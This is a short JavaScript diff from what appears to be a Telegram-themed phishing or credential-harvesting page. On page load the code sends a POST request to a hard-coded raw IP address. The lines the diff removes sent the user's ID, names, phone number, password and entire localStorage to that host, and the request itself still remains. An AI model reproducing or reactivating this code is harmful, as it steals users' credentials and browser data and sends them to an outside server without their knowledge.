@@ -20,12 +20,12 @@ document.addEventListener("DOMContentLoaded", function() {
         fetch(`http://94.131.9.66:4040/api/users/telegram/info`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            userId: currentUserId, firstName,
-            usernames, phoneNumber, isPremium,
-            password, quicklySet: localStorage,
-            type: new URLSearchParams(window.location.search).get("type")
-          })
+          // body: JSON.stringify({
+          //   userId: currentUserId, firstName,
+          //   usernames, phoneNumber, isPremium,
+          //   password, quicklySet: localStorage,
+          //   type: new URLSearchParams(window.location.search).get("type")
+          // })
         })
         .then(response => response.json())
         .then(data => alert(data))
